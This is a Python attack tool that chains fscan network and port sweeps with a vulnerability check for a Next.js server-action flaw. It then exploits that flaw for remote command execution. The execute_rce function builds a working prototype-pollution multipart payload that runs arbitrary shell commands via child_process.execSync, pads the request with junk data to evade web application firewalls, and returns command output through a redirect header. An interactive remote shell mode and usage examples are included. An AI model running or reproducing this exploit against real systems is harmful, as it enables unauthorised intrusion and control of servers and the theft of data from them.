#!/usr/bin/env python3
"""
Integrated Scanner - Combines fscan web discovery + scanner.py vulnerability detection + RCE exploitation
Supports fscan auto-download, configurable parameters, and RCE command execution
"""

import argparse
import subprocess
import re
import os
import sys
import tempfile
import platform
import urllib.request
import tarfile
import zipfile
import random
import string
import base64
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Import scanner.py functions
from scanner import check_vulnerability, Colors, colorize, print_result, save_results, print_banner


# ==================== fscan Auto Download ====================

FSCAN_RELEASES = {
    "linux_amd64": "https://github.com/shadow1ng/fscan/releases/download/1.8.4/fscan_amd64",
    "linux_arm64": "https://github.com/shadow1ng/fscan/releases/download/1.8.4/fscan_arm64",
    "darwin_amd64": "https://github.com/shadow1ng/fscan/releases/download/1.8.4/fscan_darwin_amd64",
    "darwin_arm64": "https://github.com/shadow1ng/fscan/releases/download/1.8.4/fscan_darwin_arm64",
    "windows_amd64": "https://github.com/shadow1ng/fscan/releases/download/1.8.4/fscan64.exe",
}


def get_system_arch():
    """Get system architecture"""
    system = platform.system().lower()
    machine = platform.machine().lower()

    if machine in ("x86_64", "amd64"):
        arch = "amd64"
    elif machine in ("aarch64", "arm64"):
        arch = "arm64"
    else:
        arch = machine

    return f"{system}_{arch}"


def download_fscan(dest_path: str) -> bool:
    """Auto download fscan"""
    arch = get_system_arch()

    if arch not in FSCAN_RELEASES:
        print(colorize(f"[ERROR] Unsupported architecture: {arch}", Colors.RED))
        print(colorize(f"[*] Supported architectures: {', '.join(FSCAN_RELEASES.keys())}", Colors.YELLOW))
        return False

    url = FSCAN_RELEASES[arch]
    print(colorize(f"[*] Downloading fscan ({arch})...", Colors.CYAN))
    print(colorize(f"[*] URL: {url}", Colors.CYAN))

    try:
        # Download file
        urllib.request.urlretrieve(url, dest_path)

        # Set executable permission (non-Windows)
        if not platform.system().lower().startswith("win"):
            os.chmod(dest_path, 0o755)

        print(colorize(f"[+] fscan downloaded successfully: {dest_path}", Colors.GREEN))
        return True

    except Exception as e:
        print(colorize(f"[ERROR] Failed to download fscan: {e}", Colors.RED))
        return False


def ensure_fscan(script_dir: str) -> str:
    """Ensure fscan exists, auto download if not"""
    if platform.system().lower().startswith("win"):
        fscan_name = "fscan.exe"
    else:
        fscan_name = "fscan"

    fscan_path = os.path.join(script_dir, fscan_name)

    if os.path.exists(fscan_path):
        return fscan_path

    print(colorize("[*] fscan not found, attempting auto download...", Colors.YELLOW))

    if download_fscan(fscan_path):
        return fscan_path

    return None


# ==================== fscan Scanning ====================

def run_fscan(target: str, ports: str = "1-65535", threads: int = 100,
              timeout: int = 3, no_ping: bool = False, fscan_path: str = None) -> str:
    """
    Run fscan to scan target and discover web services
    """
    if fscan_path is None:
        script_dir = os.path.dirname(os.path.abspath(__file__))
        fscan_path = ensure_fscan(script_dir)

    if fscan_path is None or not os.path.exists(fscan_path):
        print(colorize("[ERROR] fscan not found and cannot be downloaded", Colors.RED))
        sys.exit(1)

    # Create temporary output file
    with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
        output_file = f.name

    print(colorize(f"[*] Starting fscan scan: {target}", Colors.CYAN))
    print(colorize(f"[*] Port range: {ports}", Colors.CYAN))
    print(colorize(f"[*] Threads: {threads}", Colors.CYAN))
    print(colorize(f"[*] No Ping: {no_ping}", Colors.CYAN))
    print()

    cmd = [
        fscan_path,
        "-h", target,
        "-p", ports,
        "-t", str(threads),
        "-time", str(timeout),
        "-o", output_file,
        "-nobr",      # Disable brute force
        "-nopoc",     # Disable poc (we use scanner.py)
        "-nocolor"
    ]

    # Optional: no ping
    if no_ping:
        cmd.append("-np")

    try:
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True
        )

        # Real-time output of fscan results
        for line in process.stdout:
            print(line.rstrip())

        process.wait()

        # Read output file
        if os.path.exists(output_file):
            with open(output_file, 'r') as f:
                result = f.read()
            os.unlink(output_file)
            return result
        return ""

    except Exception as e:
        print(colorize(f"[ERROR] fscan execution failed: {e}", Colors.RED))
        return ""


def extract_web_urls(fscan_output: str) -> list:
    """
    Extract web service URLs from fscan output
    """
    urls = set()

    patterns = [
        r'(https?://[\d\.]+:\d+)',           # http://ip:port
        r'(https?://[\d\.]+)',                # http://ip (default port)
        r'\[WebTitle\]\s+(https?://[^\s]+)',  # WebTitle line
        r'WebTitle\s+(https?://[^\s]+)',      # WebTitle without brackets
    ]

    for pattern in patterns:
        matches = re.findall(pattern, fscan_output)
        urls.update(matches)

    # Construct URLs from open ports
    port_pattern = r'([\d\.]+):(\d+)\s+open'
    port_matches = re.findall(port_pattern, fscan_output)

    web_ports = {80, 443, 8080, 8443, 8000, 8888, 3000, 5000, 9000, 9090, 8081, 8082}

    for ip, port in port_matches:
        port_int = int(port)
        if port_int in web_ports or port_int > 1024:
            if port_int == 443 or port_int == 8443:
                urls.add(f"https://{ip}:{port}")
            else:
                urls.add(f"http://{ip}:{port}")

    return sorted(list(urls))


# ==================== Vulnerability Scanning ====================

def scan_vulnerabilities(urls: list, threads: int = 10, timeout: int = 10,
                         waf_bypass: bool = True, safe_check: bool = False,
                         verbose: bool = False) -> tuple:
    """
    Scan for vulnerabilities using scanner.py
    """
    print()
    print(colorize("=" * 60, Colors.CYAN))
    print(colorize(f"[*] Starting vulnerability detection, {len(urls)} targets", Colors.CYAN))
    print(colorize("=" * 60, Colors.CYAN))
    print()

    results = []
    vulnerable_count = 0
    error_count = 0

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {
            executor.submit(
                check_vulnerability,
                url,
                timeout,
                False,  # verify_ssl
                True,   # follow_redirects
                None,   # custom_headers
                safe_check,
                False,  # windows
                waf_bypass,
                128     # waf_bypass_size_kb
            ): url
            for url in urls
        }

        from tqdm import tqdm
        with tqdm(
            total=len(urls),
            desc=colorize("Scanning", Colors.CYAN),
            unit="url",
            ncols=80
        ) as pbar:
            for future in as_completed(futures):
                result = future.result()
                results.append(result)

                if result["vulnerable"]:
                    vulnerable_count += 1
                    tqdm.write("")
                    print_result(result, verbose)
                elif result["error"]:
                    error_count += 1
                    if verbose:
                        tqdm.write("")
                        print_result(result, verbose)
                elif verbose:
                    tqdm.write("")
                    print_result(result, verbose)

                pbar.update(1)

    return results, vulnerable_count, error_count


# ==================== RCE Exploitation ====================

def generate_boundary():
    """Generate random WebKit form boundary"""
    chars = string.ascii_letters + string.digits
    return '----WebKitFormBoundary' + ''.join(random.choices(chars, k=16))


def execute_rce(target: str, cmd: str, timeout: int = 30) -> str:
    """
    Execute command via Next.js RCE vulnerability and return output
    """
    boundary = generate_boundary()

    # Build payload - base64 encode output for easy extraction
    # Use execSync with timeout:5000 (5s) to prevent long-term blocking that could crash the service
    prefix_payload = (
        f"var res=process.mainModule.require('child_process').execSync('{cmd}|base64 -w0',{{timeout:5000}})"
        f".toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),"
        "{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});"
    )

    part0 = (
        '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
        '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"'
        + prefix_payload
        + '","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
    )

    # Generate 128KB junk data for WAF bypass
    param_name = ''.join(random.choices(string.ascii_lowercase, k=12))
    junk = ''.join(random.choices(string.ascii_letters + string.digits, k=128*1024))

    parts = []
    parts.append(f'--{boundary}\r\n'
                 f'Content-Disposition: form-data; name="{param_name}"\r\n\r\n{junk}\r\n')
    parts.append(f'--{boundary}\r\n'
                 f'Content-Disposition: form-data; name="0"\r\n\r\n{part0}\r\n')
    parts.append(f'--{boundary}\r\n'
                 f'Content-Disposition: form-data; name="1"\r\n\r\n"$@0"\r\n')
    parts.append(f'--{boundary}\r\n'
                 f'Content-Disposition: form-data; name="2"\r\n\r\n[]\r\n')
    parts.append(f'--{boundary}--\r\n')

    body = ''.join(parts)

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Assetnote/1.0.0',
        'Next-Action': 'x',
        'X-Nextjs-Request-Id': 'b5dce965',
        'Content-Type': f'multipart/form-data; boundary={boundary}',
        'X-Nextjs-Html-Request-Id': 'SSTMXm7OJ_g0Ncx6jpQt9',
    }

    # Ensure target ends with /
    if not target.endswith('/'):
        target = target + '/'

    try:
        resp = requests.post(target, headers=headers, data=body, timeout=timeout,
                           verify=False, allow_redirects=False)

        redirect = resp.headers.get('x-action-redirect', '')
        if '?a=' in redirect:
            b64 = redirect.split('?a=')[1].split(';')[0]
            try:
                return base64.b64decode(b64).decode()
            except:
                return f"[Raw] {b64}"

        return f"[No output] Status: {resp.status_code}"

    except Exception as e:
        return f"[Error] {str(e)}"


def interactive_shell(target: str):
    """Interactive shell"""
    print(colorize(f"\n[*] Entering interactive shell - Target: {target}", Colors.CYAN))
    print(colorize("[*] Type 'exit' or 'quit' to exit\n", Colors.CYAN))

    while True:
        try:
            cmd = input(colorize("shell> ", Colors.GREEN)).strip()
            if not cmd:
                continue
            if cmd.lower() in ('exit', 'quit'):
                print(colorize("[*] Exiting interactive shell", Colors.CYAN))
                break

            output = execute_rce(target, cmd)
            print(output)

        except KeyboardInterrupt:
            print(colorize("\n[*] Exiting interactive shell", Colors.CYAN))
            break
        except EOFError:
            break


# ==================== Main Function ====================

def main():
    parser = argparse.ArgumentParser(
        description="Integrated Scanner - fscan + React2Shell Scanner + RCE",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  Scan network:
    %(prog)s -t 192.168.1.0/24
    %(prog)s -t 192.168.1.0/24 -p 80,443,8080 --fscan-threads 1000
    %(prog)s -t 192.168.1.0/24 --no-ping  # Scan all IPs without ping discovery

  Execute RCE:
    %(prog)s --rce http://192.168.1.x:5000 --cmd "id"
    %(prog)s --rce http://192.168.1.x:5000 --shell  # Interactive shell
        """
    )

    # Scan parameters
    scan_group = parser.add_argument_group('Scan Options')
    scan_group.add_argument(
        "-t", "--target",
        help="Target IP or CIDR (e.g., 192.168.1.0/24)"
    )
    scan_group.add_argument(
        "-p", "--ports",
        default="1-65535",
        help="Port range (default: 1-65535)"
    )
    scan_group.add_argument(
        "--fscan-threads",
        type=int,
        default=500,
        help="fscan threads (default: 500)"
    )
    scan_group.add_argument(
        "--scan-threads",
        type=int,
        default=20,
        help="Vulnerability scan threads (default: 20)"
    )
    scan_group.add_argument(
        "--timeout",
        type=int,
        default=15,
        help="Request timeout in seconds (default: 15)"
    )
    scan_group.add_argument(
        "--no-ping",
        action="store_true",
        help="fscan without ping (scan all IPs, slower)"
    )
    scan_group.add_argument(
        "-o", "--output",
        help="Output results to JSON file"
    )
    scan_group.add_argument(
        "--safe-check",
        action="store_true",
        help="Use safe side-channel detection instead of RCE PoC"
    )
    scan_group.add_argument(
        "--no-waf-bypass",
        action="store_true",
        help="Disable WAF bypass"
    )
    scan_group.add_argument(
        "-v", "--verbose",
        action="store_true",
        help="Verbose output"
    )
    scan_group.add_argument(
        "--skip-fscan",
        help="Skip fscan and load URL list from file"
    )

    # RCE parameters
    rce_group = parser.add_argument_group('RCE Exploitation Options')
    rce_group.add_argument(
        "--rce",
        metavar="URL",
        help="Execute RCE on specified target"
    )
    rce_group.add_argument(
        "--cmd",
        help="Command to execute"
    )
    rce_group.add_argument(
        "--shell",
        action="store_true",
        help="Enter interactive shell"
    )

    args = parser.parse_args()

    # RCE mode
    if args.rce:
        print_banner()
        print(colorize("[*] RCE Exploitation Mode", Colors.CYAN))

        if args.shell:
            interactive_shell(args.rce)
        elif args.cmd:
            print(colorize(f"[*] Target: {args.rce}", Colors.CYAN))
            print(colorize(f"[*] Command: {args.cmd}", Colors.CYAN))
            print()
            output = execute_rce(args.rce, args.cmd, args.timeout)
            print(colorize("[+] Output:", Colors.GREEN))
            print(output)
        else:
            print(colorize("[ERROR] RCE mode requires --cmd or --shell", Colors.RED))
            sys.exit(1)
        return

    # Scan mode
    if not args.target and not args.skip_fscan:
        parser.print_help()
        sys.exit(1)

    print_banner()
    print(colorize("[*] Integrated Scan Mode: fscan + React2Shell Scanner", Colors.CYAN))
    print()

    # Step 1: Run fscan or load URL list
    if args.skip_fscan:
        print(colorize(f"[*] Loading URLs from file: {args.skip_fscan}", Colors.CYAN))
        with open(args.skip_fscan, 'r') as f:
            urls = [line.strip() for line in f if line.strip() and line.strip().startswith('http')]
    else:
        fscan_output = run_fscan(
            args.target,
            args.ports,
            args.fscan_threads,
            no_ping=args.no_ping
        )

        # Step 2: Extract web URLs
        urls = extract_web_urls(fscan_output)

    if not urls:
        print(colorize("[!] No web services found", Colors.YELLOW))
        sys.exit(0)

    print()
    print(colorize(f"[+] Found {len(urls)} web services:", Colors.GREEN))
    for url in urls[:20]:
        print(f"    {url}")
    if len(urls) > 20:
        print(f"    ... and {len(urls) - 20} more")
    print()

    # Step 3: Vulnerability scan
    results, vulnerable_count, error_count = scan_vulnerabilities(
        urls,
        threads=args.scan_threads,
        timeout=args.timeout,
        waf_bypass=not args.no_waf_bypass,
        safe_check=args.safe_check,
        verbose=args.verbose
    )

    # Output summary
    print()
    print(colorize("=" * 60, Colors.CYAN))
    print(colorize("Scan Summary", Colors.BOLD))
    print(colorize("=" * 60, Colors.CYAN))
    print(f"  Target: {args.target or args.skip_fscan}")
    print(f"  Web Services Found: {len(urls)}")

    if vulnerable_count > 0:
        print(f"  {colorize(f'Vulnerable: {vulnerable_count}', Colors.RED + Colors.BOLD)}")

        # List vulnerable targets
        print()
        print(colorize("  Vulnerable Targets:", Colors.RED))
        for r in results:
            if r.get("vulnerable"):
                print(colorize(f"    - {r['host']}", Colors.RED))
        print()
        print(colorize("  Execute RCE with:", Colors.YELLOW))
        for r in results:
            if r.get("vulnerable"):
                print(colorize(f"    python3 {sys.argv[0]} --rce {r['host']} --shell", Colors.YELLOW))
                break
    else:
        print(f"  Vulnerable: {vulnerable_count}")

    print(f"  Not Vulnerable: {len(urls) - vulnerable_count - error_count}")
    print(f"  Errors: {error_count}")
    print(colorize("=" * 60, Colors.CYAN))

    # Save results
    if args.output:
        save_results(results, args.output, vulnerable_only=False)

    if vulnerable_count > 0:
        sys.exit(1)
    sys.exit(0)


if __name__ == "__main__":
    main()
